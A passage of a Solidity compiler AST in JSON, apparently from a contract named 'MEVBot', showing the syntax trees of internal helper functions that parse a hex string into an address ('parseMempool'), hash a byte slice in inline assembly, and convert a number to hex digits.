																					"typeString": "uint160"
																				}
																			},
																			"nodeType": "Assignment",
																			"operator": "-=",
																			"rightHandSide": {
																				"argumentTypes": null,
																				"hexValue": "3837",
																				"id": 854,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "8933:2:0",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_87_by_1",
																					"typeString": "int_const 87"
																				},
																				"value": "87"
																			},
																			"src": "8927:8:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			}
																		},
																		"id": 856,
																		"nodeType": "ExpressionStatement",
																		"src": "8927:8:0"
																	}
																]
															}
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 896,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 889,
																	"name": "iaddr",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 745,
																	"src": "9117:5:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint160",
																		"typeString": "uint160"
																	}
																},
																"nodeType": "Assignment",
																"operator": "+=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"components": [
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			},
																			"id": 894,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				},
																				"id": 892,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 890,
																					"name": "b1",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 749,
																					"src": "9127:2:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "*",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "3136",
																					"id": 891,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "9132:2:0",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_16_by_1",
																						"typeString": "int_const 16"
																					},
																					"value": "16"
																				},
																				"src": "9127:7:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "+",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 893,
																				"name": "b2",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 752,
																				"src": "9137:2:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"src": "9127:12:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			}
																		}
																	],
																	"id": 895,
																	"isConstant": false,
																	"isInlineArray": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "TupleExpression",
																	"src": "9126:14:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint160",
																		"typeString": "uint160"
																	}
																},
																"src": "9117:23:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint160",
																	"typeString": "uint160"
																}
															},
															"id": 897,
															"nodeType": "ExpressionStatement",
															"src": "9117:23:0"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 764,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 758,
														"name": "i",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 755,
														"src": "8489:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_rational_42_by_1",
															"typeString": "int_const 42"
														},
														"id": 763,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"hexValue": "32",
															"id": 759,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "8493:1:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_2_by_1",
																"typeString": "int_const 2"
															},
															"value": "2"
														},
														"nodeType": "BinaryOperation",
														"operator": "+",
														"rightExpression": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_rational_40_by_1",
																"typeString": "int_const 40"
															},
															"id": 762,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"hexValue": "32",
																"id": 760,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "8497:1:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_2_by_1",
																	"typeString": "int_const 2"
																},
																"value": "2"
															},
															"nodeType": "BinaryOperation",
															"operator": "*",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "3230",
																"id": 761,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "8501:2:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_20_by_1",
																	"typeString": "int_const 20"
																},
																"value": "20"
															},
															"src": "8497:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_rational_40_by_1",
																"typeString": "int_const 40"
															}
														},
														"src": "8493:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_rational_42_by_1",
															"typeString": "int_const 42"
														}
													},
													"src": "8489:14:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 899,
												"initializationExpression": {
													"assignments": [
														755
													],
													"declarations": [
														{
															"constant": false,
															"id": 755,
															"mutability": "mutable",
															"name": "i",
															"nodeType": "VariableDeclaration",
															"overrides": null,
															"scope": 899,
															"src": "8477:6:0",
															"stateVariable": false,
															"storageLocation": "default",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"typeName": {
																"id": 754,
																"name": "uint",
																"nodeType": "ElementaryTypeName",
																"src": "8477:4:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"value": null,
															"visibility": "internal"
														}
													],
													"id": 757,
													"initialValue": {
														"argumentTypes": null,
														"hexValue": "32",
														"id": 756,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "8486:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_2_by_1",
															"typeString": "int_const 2"
														},
														"value": "2"
													},
													"nodeType": "VariableDeclarationStatement",
													"src": "8477:10:0"
												},
												"loopExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 767,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"argumentTypes": null,
															"id": 765,
															"name": "i",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 755,
															"src": "8505:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "+=",
														"rightHandSide": {
															"argumentTypes": null,
															"hexValue": "32",
															"id": 766,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "8510:1:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_2_by_1",
																"typeString": "int_const 2"
															},
															"value": "2"
														},
														"src": "8505:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 768,
													"nodeType": "ExpressionStatement",
													"src": "8505:6:0"
												},
												"nodeType": "ForStatement",
												"src": "8472:679:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 902,
															"name": "iaddr",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 745,
															"src": "9175:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint160",
																"typeString": "uint160"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint160",
																"typeString": "uint160"
															}
														],
														"id": 901,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "9167:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_address_$",
															"typeString": "type(address)"
														},
														"typeName": {
															"id": 900,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "9167:7:0",
															"typeDescriptions": {
																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 903,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "9167:14:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_address_payable",
														"typeString": "address payable"
													}
												},
												"functionReturnParameters": 736,
												"id": 904,
												"nodeType": "Return",
												"src": "9160:21:0"
											}
										]
									},
									"documentation": null,
									"id": 906,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "parseMempool",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 733,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 732,
												"mutability": "mutable",
												"name": "_a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 906,
												"src": "8298:16:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 731,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "8298:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "8297:18:0"
									},
									"returnParameters": {
										"id": 736,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 735,
												"mutability": "mutable",
												"name": "_parsed",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 906,
												"src": "8339:15:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 734,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "8339:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "8338:17:0"
									},
									"scope": 1583,
									"src": "8276:912:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 914,
										"nodeType": "Block",
										"src": "9418:100:0",
										"statements": [
											{
												"AST": {
													"nodeType": "YulBlock",
													"src": "9437:75:0",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "9451:51:0",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "self",
																						"nodeType": "YulIdentifier",
																						"src": "9478:4:0"
																					},
																					{
																						"kind": "number",
																						"nodeType": "YulLiteral",
																						"src": "9484:2:0",
																						"type": "",
																						"value": "32"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nodeType": "YulIdentifier",
																					"src": "9474:3:0"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "9474:13:0"
																			}
																		],
																		"functionName": {
																			"name": "mload",
																			"nodeType": "YulIdentifier",
																			"src": "9468:5:0"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "9468:20:0"
																	},
																	{
																		"arguments": [
																			{
																				"name": "self",
																				"nodeType": "YulIdentifier",
																				"src": "9496:4:0"
																			}
																		],
																		"functionName": {
																			"name": "mload",
																			"nodeType": "YulIdentifier",
																			"src": "9490:5:0"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "9490:11:0"
																	}
																],
																"functionName": {
																	"name": "keccak256",
																	"nodeType": "YulIdentifier",
																	"src": "9458:9:0"
																},
																"nodeType": "YulFunctionCall",
																"src": "9458:44:0"
															},
															"variableNames": [
																{
																	"name": "ret",
																	"nodeType": "YulIdentifier",
																	"src": "9451:3:0"
																}
															]
														}
													]
												},
												"evmVersion": "istanbul",
												"externalReferences": [
													{
														"declaration": 911,
														"isOffset": false,
														"isSlot": false,
														"src": "9451:3:0",
														"valueSize": 1
													},
													{
														"declaration": 908,
														"isOffset": false,
														"isSlot": false,
														"src": "9478:4:0",
														"valueSize": 1
													},
													{
														"declaration": 908,
														"isOffset": false,
														"isSlot": false,
														"src": "9496:4:0",
														"valueSize": 1
													}
												],
												"id": 913,
												"nodeType": "InlineAssembly",
												"src": "9428:84:0"
											}
										]
									},
									"documentation": null,
									"id": 915,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "keccak",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 909,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 908,
												"mutability": "mutable",
												"name": "self",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 915,
												"src": "9363:17:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$40_memory_ptr",
													"typeString": "struct MEVBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 907,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 40,
													"src": "9363:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$40_storage_ptr",
														"typeString": "struct MEVBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "9362:19:0"
									},
									"returnParameters": {
										"id": 912,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 911,
												"mutability": "mutable",
												"name": "ret",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 915,
												"src": "9405:11:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes32",
													"typeString": "bytes32"
												},
												"typeName": {
													"id": 910,
													"name": "bytes32",
													"nodeType": "ElementaryTypeName",
													"src": "9405:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes32",
														"typeString": "bytes32"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "9404:13:0"
									},
									"scope": 1583,
									"src": "9347:171:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 991,
										"nodeType": "Block",
										"src": "9798:352:0",
										"statements": [
											{
												"assignments": [
													923
												],
												"declarations": [
													{
														"constant": false,
														"id": 923,
														"mutability": "mutable",
														"name": "count",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 991,
														"src": "9809:10:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 922,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "9809:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 925,
												"initialValue": {
													"argumentTypes": null,
													"hexValue": "30",
													"id": 924,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "9822:1:0",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_0_by_1",
														"typeString": "int_const 0"
													},
													"value": "0"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "9809:14:0"
											},
											{
												"assignments": [
													927
												],
												"declarations": [
													{
														"constant": false,
														"id": 927,
														"mutability": "mutable",
														"name": "b",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 991,
														"src": "9833:6:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 926,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "9833:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 929,
												"initialValue": {
													"argumentTypes": null,
													"id": 928,
													"name": "a",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 917,
													"src": "9842:1:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "9833:10:0"
											},
											{
												"body": {
													"id": 940,
													"nodeType": "Block",
													"src": "9868:53:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 934,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "UnaryOperation",
																"operator": "++",
																"prefix": false,
																"src": "9882:7:0",
																"subExpression": {
																	"argumentTypes": null,
																	"id": 933,
																	"name": "count",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 923,
																	"src": "9882:5:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 935,
															"nodeType": "ExpressionStatement",
															"src": "9882:7:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 938,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 936,
																	"name": "b",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 927,
																	"src": "9903:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "/=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "3136",
																	"id": 937,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "9908:2:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_16_by_1",
																		"typeString": "int_const 16"
																	},
																	"value": "16"
																},
																"src": "9903:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 939,
															"nodeType": "ExpressionStatement",
															"src": "9903:7:0"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 932,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 930,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 927,
														"src": "9860:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "!=",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 931,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "9865:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "9860:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 941,
												"nodeType": "WhileStatement",
												"src": "9853:68:0"
											},
											{
												"assignments": [
													943
												],
												"declarations": [
													{
														"constant": false,
														"id": 943,
														"mutability": "mutable",
														"name": "res",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 991,
														"src": "9930:16:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes"
														},
														"typeName": {
															"id": 942,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "9930:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 948,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 946,
															"name": "count",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 923,
															"src": "9959:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 945,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "NewExpression",
														"src": "9949:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_objectcreation_pure$_t_uint256_$returns$_t_bytes_memory_ptr_$",
															"typeString": "function (uint256) pure returns (bytes memory)"
														},
														"typeName": {
															"id": 944,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "9953:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														}
													},
													"id": 947,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "9949:16:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_memory_ptr",
														"typeString": "bytes memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "9930:35:0"
											},
											{
												"body": {
													"id": 984,
													"nodeType": "Block",
													"src": "10004:111:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 963,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 959,
																	"name": "b",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 927,
																	"src": "10018:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 962,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"id": 960,
																		"name": "a",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 917,
																		"src": "10022:1:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "%",
																	"rightExpression": {
																		"argumentTypes": null,
																		"hexValue": "3136",
																		"id": 961,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "10026:2:0",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_16_by_1",
																			"typeString": "int_const 16"
																		},
																		"value": "16"
																	},
																	"src": "10022:6:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "10018:10:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 964,
															"nodeType": "ExpressionStatement",
															"src": "10018:10:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 978,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"baseExpression": {
																		"argumentTypes": null,
																		"id": 965,
																		"name": "res",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 943,
																		"src": "10042:3:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	},
																	"id": 971,
																	"indexExpression": {
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		},
																		"id": 970,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 968,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 966,
																				"name": "count",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 923,
																				"src": "10046:5:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "-",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 967,
																				"name": "i",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 950,
																				"src": "10054:1:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "10046:9:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "-",
																		"rightExpression": {
																			"argumentTypes": null,
																			"hexValue": "31",
																			"id": 969,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "10058:1:0",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_1_by_1",
																				"typeString": "int_const 1"
																			},
																			"value": "1"
																		},
																		"src": "10046:13:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"nodeType": "IndexAccess",
																	"src": "10042:18:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes1",
																		"typeString": "bytes1"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"id": 975,
																					"name": "b",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 927,
																					"src": "10080:1:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				],
																				"id": 974,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "10074:5:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_uint8_$",
																					"typeString": "type(uint8)"
																				},
																				"typeName": {
																					"id": 973,
																					"name": "uint8",
																					"nodeType": "ElementaryTypeName",
																					"src": "10074:5:0",
																					"typeDescriptions": {
																						"typeIdentifier": null,
																						"typeString": null
																					}
																				}
																			},
																			"id": 976,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "10074:8:0",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		],
																		"id": 972,
																		"name": "toHexDigit",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1335,
																		"src": "10063:10:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_internal_pure$_t_uint8_$returns$_t_bytes1_$",
																			"typeString": "function (uint8) pure returns (bytes1)"
																		}
																	},
																	"id": 977,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "10063:20:0",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes1",
																		"typeString": "bytes1"
																	}
																},
